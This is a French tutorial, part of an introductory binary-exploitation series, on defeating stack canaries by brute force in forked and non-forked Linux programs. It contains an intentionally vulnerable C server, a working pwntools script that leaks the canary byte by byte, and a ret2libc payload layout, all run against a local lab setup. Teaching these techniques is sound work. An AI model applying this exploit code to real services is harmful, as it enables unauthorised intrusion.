---
title: Partie 12 - Contourner les canaris - exploitation avancée et limites (2/2)
date: 2026-04-27 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Contourner les canaris : exploitation avancée et limites (2/2)

Voyons ensemble ce qu'il est possible de faire lorsque nous **ne pouvons pas faire fuiter** la valeur du canari. 

## 🦾 Utilisation de la *force brute* 

![](/assets/images/introduction_au_pwn/bf_meme.png)

Malheureusement, il n'est pas toujours possible de récupérer la valeur du canari en la faisant fuiter. Dans certains cas, il va falloir prendre le taureau par les cornes.

Il y a **deux situations** possibles :

1. **soit le programme est issu de la fonction** `fork` : nous pouvons alors utiliser un *brute force* "intelligent" ;
2. **soit il ne l'est pas** : nous devons utiliser un *brute force* classique.

### Processus issu d'un `fork` 👶

Contrairement à Windows, Linux possède un mécanisme permettant de cloner un processus. Ce que l'on entend par "cloner" est que toute la **mémoire** du processus, les **descripteurs de fichiers** et le **contexte d'exécution** (registres ...) sont copiés pour en faire un nouveau processus. Tout n'est pas **totalement dupliqué**, pour savoir ce qui ne l'est pas, vous pouvez vous référer à `man fork`.

On appelle **processus père** 👨 le processus qui a appelé `fork` et **processus fils** 👶 celui qui a été lancé par `fork`. L'utilité et l'intérêt d'utiliser `fork` sont [discutées](https://www.reddit.com/r/cpp/comments/4w4nmv/is_fork_as_horrible_as_it_looks/) mais ce n'est pas le sujet ici 🫣.

`man fork` liste tous les éléments qui **ne sont pas clonés** dans le processus fils par `fork`. Heureusement pour nous, le canari n'en fait pas partie. Autrement dit, le processus père et le processus fils partagent **le même canari** !

Il est possible de rencontrer certains challenges qui utilisent `fork`, notamment dans des programmes qui jouent un rôle de **serveur** avec des tâches à traiter provenant de **clients**. Cela signifie qu'à chaque fois que l'on se connecte au serveur, un **processus fils** avec le **même canari** est généré.

> D'accord, on sait que le canari du processus fils sera toujours le même, mais en quoi cela nous avance ? On ne sait toujours pas quelle est sa valeur 😶.
{: .prompt-info }

Le fait de savoir que le canari ne change pas d'une connexion à une autre ne nous donne pas directement sa valeur, je vous l'accorde. 

Néanmoins, il existe une manière d'en tirer profit. Voyons un exemple (merci ChatGPT 🤖 pour les travaux) avec le programme ci-dessous qui traite les connexions avec un `fork`. 

Le programme est un peu plus long que d'habitude, honnêtement, il n'y a pas besoin de comprendre comment il fonctionne au détail près, ce n'est pas le but. Plusieurs fonctions ne sont utilisées que pour gérer la partie réseau du programme. Nous allons rapidement survoler ce qu'il fait et nous intéresser au moyen de trouver le canari.

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 55555
#define BUFFER_SIZE 256

void handle_client(int client_fd) {
    char prenom[BUFFER_SIZE] = {0};
    read(client_fd, prenom, 500); 
    dprintf(client_fd, "Bonjour !\n");

}

void handle_client_wrapper(int client_fd){
	dprintf(client_fd, "Connexion ...\n");
	handle_client(client_fd);
	dprintf(client_fd, "... Deconnexion\n");

	close(client_fd);

}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    // Create a socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Bind the socket to localhost and port 55555
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 10) == -1) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Server is running on localhost:%d\n", PORT);

    // Accept and handle incoming connections
    while (1) {
        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
        if (client_fd == -1) {
            perror("Accept failed");
            continue;
        }

        printf("Connection accepted\n");

        // Fork a new process to handle the client
        pid_t pid = fork();
        if (pid == -1) {
            perror("Fork failed");
            close(client_fd);
            continue;
        }

        if (pid == 0) {
            // Child process: handle the client
            close(server_fd); // Close the server socket in the child process
            handle_client_wrapper(client_fd);
            exit(0); // Terminate the child process
        } else {
            // Parent process: close the client socket and continue
            close(client_fd);
        }
    }

    // Close the server socket (will never reach here in this implementation)
    close(server_fd);
    return 0;
}

```

Voici ce que fait le programme :

- il s'agit d'un **serveur** qui tourne en local à l'adresse `127.0.0.1` sur le port `55555` ;
- lorsqu'un **client se connecte**, un `fork` est réalisé ;
- le processus fils exécute alors `handle_client_wrapper` qui appelle `handle_client`. C'est dans `handle_client` qu'il y a une **vulnérabilité de dépassement de mémoire**.

Vous trouvez sans doute un peu bizarre la présence de `handle_client_wrapper` qui a l'air de ne pas faire grand chose. Détrompez-vous ! C'est justement grâce à cette fonction qu'il devient possible d'utiliser la **force brute intelligemment** par la suite.

Compilons le programme en 64 bits avec : `clang -m64 -no-pie -fstack-protector  main_bf_partiel.c -o canaris_bf_partiel`.

Si vous souhaitez utiliser le conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-stack-canaris-bf-partiel.zip](https://drive.proton.me/urls/73K7Z0HTAC#yrn46XFXxQAv)
- 🔎 **SHA256 & Analyse Virus Total** : [caac6e8e2eb60c53389eef4026be2a74b13b05ef1bef640c02b725f3adb16019](https://www.virustotal.com/gui/file/caac6e8e2eb60c53389eef4026be2a74b13b05ef1bef640c02b725f3adb16019)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-stack-canaris-bf-partiel .
docker run -it --rm -p 1234:1234 -p 55555:55555 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-stack-canaris-bf-partiel
```

> Désormais, le port `1234` sera ouvert dans les conteneurs afin que vous puissiez vous connecter (depuis l'extérieur) à `gdbserver` (à l'intérieur) afin de **déboguer le programme à distance** si besoin. 
{: .prompt-tip }

Ouvrons **deux terminaux** :

1. **premier terminal** : lancez le programme avec `./canaris_bf_partiel`, il s'agit du serveur ;
2. **deuxième terminal** :  connectez-vous au serveur avec `nc 127.0.0.1 55555`, c'est le client. Pour ceux qui utilisent le conteneur Docker, vous devriez pouvoir vous connecter au serveur depuis votre machine, à l'extérieur du conteneur.

En nous connectant, nous obtenons ceci :

```
$ nc 127.0.0.1 55555  
Connexion ...  
azert  
Bonjour !  
... Deconnexion
```

> Contrairement au précédent programme, ici `printf` n'affiche pas le contenu du *buffer* sinon il aurait été possible de faire fuiter le canari. Cela rendrait l'utilisation de la *brute force* inutile.
{: .prompt-tip }

Que se passe-t-il lorsque l'on envoie un *payload* de plus de 300 octets ?

```
$ nc 127.0.0.1 55555  
Connexion ...  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Bonjour !
```

Désormais `"... Deconnexion"` ne s'affiche plus ! Le **processus fils** a détecté que le canari a été **modifié** et s'est **prématurément arrêté**. Ainsi, ces deux lignes à la fin de la fonction `handle_client_wrapper` ne sont pas exécutées :

```cpp
dprintf(client_fd, "... Deconnexion\n");
close(client_fd);
```

> Pourquoi le serveur ne s'arrête pas s'il détecte une tentative d'exploitation ?
{: .prompt-info }

Ici ce n'est pas le canari du processus père (serveur) qui est écrasé mais celui du **processus fils** (client). C'est donc le **processus fils qui s'arrête**.

Nous allons pouvoir trouver les octets du canari **un à un** de cette manière :

1. il faut premièrement trouver la **taille du payload** permettant d'atteindre l'octet nul du canari en observant à partir de quelle taille le message `... Deconnexion` **disparaît** ;
2. nous pouvons alors ajouter **l'octet nul** du canari au *payload* ;
3. on ajoute un octet valant `0`, puis `1` ... jusqu'à `255`. On s'arrête lorsque le message `... Deconnexion` réapparaît. Cette **valeur est alors sauvegardée** et on passe à l'octet suivant ;
4. on **recommence la 3ème** étape pour les autres octets et on s'arrête lorsque l'on a trouvé les 7 octets de poids fort du canari.

Pour trouver les 7 octets, il nous faudra dans le **pire des cas** `7*256 = 1792` **essais** pour y parvenir, ce qui est tout à fait faisable, même dans le cadre d'un challenge à distance.

Voici ce que cela donne dans un script :

```python
from pwn import *
from time import sleep

# Desactivation des logs non nécessaires
context.log_level = 'critical'

# On connait le premier octet
canari = b"\x00"

for byte_i in range(7):
    print(f"[+] Itération n°[{byte_i+1}]")
    for val_j in range(256): 
	    # Connexion "a distance" ;)
        io = remote("127.0.0.1",55555)

        payload = b"A" * 264
        payload += canari
        payload += p8(val_j)

        io.send(payload)
        sleep(0.01)
        data = io.recv() # Recuperation de la sortie
        
        if b"... Deconnexion" in data:
            print(f"Octet n°{byte_i+1} -> {hex(val_j)}")
            canari += p8(val_j) # On sauvegarde l'octet trouve
            io.close()
            break # On passe à l'octet suivant
        io.close()
        
print("[+] Le canari est : ",hex(u64(canari)))
```

Quelques remarques :

- `io = remote("127.0.0.1",55555)` permet de communiquer avec un **processus distant** en TCP. Il suffit de spécifier **l'adresse IP** et le **port**. La communication avec les fonctions du type `io.send()` et `io.recv()` se font ensuite comme d'habitude.
- Pour chacun des octets nous essayons les **256 possibilités** et nous passons à l'octet suivant une fois que `... Deconnexion` est présent dans la sortie.
- Le souci avec `io.recv()` est qu'il peut nous jouer des tours lorsque l'on communique avec un **programme distant**. Nous utilisons `sleep(0.01)` afin d'attendre un minimum avant de récupérer les données reçues pour ne rien louper.

Lançons le script :

```
[+] Itération n°[1]
Octet n°1 -> 0x8c
[+] Itération n°[2]
Octet n°2 -> 0x1e
[+] Itération n°[3]
Octet n°3 -> 0x81
[+] Itération n°[4]
Octet n°4 -> 0x7b
[+] Itération n°[5]
Octet n°5 -> 0x59
[+] Itération n°[6]
Octet n°6 -> 0x11
[+] Itération n°[7]
Octet n°7 -> 0x29
Le canari est :  0x2911597b811e8c00
```

Le résultat est obtenu en **moins de 10 secondes** 🏎️ ! Bon, en vrai ce n'est pas un vrai serveur distant donc il y a beaucoup moins de latence mais l'ordre de grandeur est de la minute.

### Programme non issu d'un `fork`

Dans le cas d'un programme classique, qui n'est pas le résultat d'un `fork`, nous n'aurons pas d'autres choix que d'utiliser la force brute pour trouver **d'un coup** les 3 (ou 7) octets de poids fort du canari. En effet, dans ce scénario il n'est malheureusement **pas possible** de trouver les **octets un à un**.

Evidemment, nous utilisons ce scénario lorsqu'il n'est pas possible de faire fuiter ou contourner le canari d'une autre manière, auquel cas l'utilisation de la force brute ne serait **pas justifiée**.

Le canari est généré de manière **aléatoire** à partir de [/dev/urandom](https://fr.wikipedia.org/wiki//dev/random). 

- en **32 bits**, il y a **une chance sur 16 777 216** (`0x1000000`) de trouver le canari, ce qui est assez grand, mais **pas impossible**. 
- en **64 bits**, il y a **une chance sur 72 057 594 037 927 936** (`0x100000000000000`) ce qui n'est pas faisable avec une machine, même puissante, en [moins d'un mois](https://www.francenum.gouv.fr/magazine-du-numerique/combien-de-temps-un-pirate-met-il-pour-trouver-votre-mot-de-passe-comment) (en faisant l'analogie avec le *bruteforce* d'un mot de passe de 7 caractères).

En **32 bits**, nous pouvons utiliser la force brute pour trouver le canari et ce, même sur une machine personnelle. Pour vous en convaincre, utilisons le programme suivant `main_full_bf.c` :

```cpp
#include "stdio.h"

int main()
{

  char buf[0x100] = {0};

  unsigned int canari = *(unsigned int *)(&buf[0x100]);
  unsigned int deadbe00 = 0xdeadbe00;
  
  if(canari == deadbe00)
    {
      puts("Bravo ! Vous avez trouvé la valeur du canari !");
      getchar();
    }

  return 0;
}
```

Le canari est situé immédiatement après le *buffer* `buf` dont la valeur est récupérée dans `canari`. Ensuite, nous comparons la valeur de canari avec `0xdeadbe00` et s'ils ont la même valeur, `"Bravo ! Vous avez trouvé la valeur du canari !"` est affiché.

> Nous avons choisi ici `0xdeadbe00` mais vous pouvez choisir **n'importe quelle valeur de 32 bits** tant que l'octet de poids faible est nul.
{: .prompt-tip }

Compilons le programme avec `clang -m32 -no-pie -fstack-protector main_full_bf.c -o canaris_full_bf`.

Ajoutons, dans le même dossier, le script **bash** suivant :

```sh
#!/bin/bash  
while true; do ./canaris_full_bf; done
```

Ce script va lancer en boucle le programme. Si `"Bravo ! Vous avez trouvé la valeur du canari !"` s'affiche, cela signifie que lors d'un des tours de la boucle, le canari valait bien `0xdeadbe00` et c'est gagné.

Pour aller plus vite, nous allons exécuter ce script en parallèle sur plusieurs cœurs (dans mon cas 10) du processeur grâce à l'outil `parallel` :

```sh
parallel --line-buffer --jobs 10 ./script.sh ::: {1..10}
```

> En lançant cette commande et en fonction de votre machine, cette dernière risque de beaucoup chauffer 🔥.
{: .prompt-warning }

![](/assets/images/introduction_au_pwn/meme_force.png)

Après **42 minutes**, il y a un cas où le canari vaut `0xdeadbe00`. Trouver la valeur du canari en moins d'une heure n'est pas considéré comme **très long en termes d'exploitation** dans le cas d'un challenge où l'on a **accès à la machine** du programme vulnérable. Dans le cas d'un **challenge à distance**, cela prendrait bien plus de temps et perdrait de son intérêt.

## Trouver la valeur du canari, ensuite ?

> On a vu différentes manières de récupérer ou contrôler la valeur du canari mais ensuite on fait quoi ?
{: .prompt-info }

A l'instar du contrôle de `eip`, connaître la valeur du canari n'est qu'une **étape intermédiaire** lors de l'exploitation d'un programme.

A partir du moment où nous pouvons faire abstraction du canari, car nous connaissons sa valeur, il suffit simplement de l'insérer au bon *offset* du *payload* et **continuer l'exploitation** en ignorant sa présence.

Par exemple, dans le cas que nous avons rencontré précédemment où l'**ASLR** est désactivée et la pile n'est pas exécutable, nous pouvons tenter un **ret2libc**. La seule différence est que nous devrons insérer la valeur du canari dans notre *payload* en partant de ceci :

```
[padding]+[adresse de retour n°1]+[adresse de retour n°2]+[arg n°1] + [...] 
```

vers cela :

```
[padding n°1]+[canari]+[padding n°2]+[adresse de retour n°1]+[adresse de retour n°2]+[arg n°1] + [...] 
```

avec :
- `[padding n°1]` : le bourrage permettant **d'atteindre le canari** ;
- `[padding n°2]` : le bourrage écrasant les registres sauvegardés (donc `ebp`) permettant **d'atteindre l'adresse de retour** à modifier.

## 📋 Synthèse

Nous avons exploré deux techniques basées sur la force brute pour exploiter un programme lorsque la **valeur du canari** demeure **inconnue** :

- **Force brute partielle** (avec `fork`) :
    - le processus fils partage le **même canari** que le processus père ;
    - on devine les octets du canari **un à un**, en testant toutes les valeurs pour un octet donné jusqu'à ce que le programme termine son exécution normalement.
- **Force brute totale** (sans `fork`) :
    - nécessite de deviner tous les octets du canari **d’un seul coup** ;
    - faisable en **32 bits** avec une probabilité d’environ 1 sur 16 millions, mais non réalisable en **64 bits**.

Ces approches, bien que coûteuses, restent utiles **en dernier recours** lorsque les autres stratégies échouent.

Une fois que la **valeur du canari est connue**, il suffit de **l'insérer** au bon endroit dans le *payload* et passer aux étapes suivantes de l'exploitation, comme le contrôle de `eip` en vue d'un **ret2libc**.
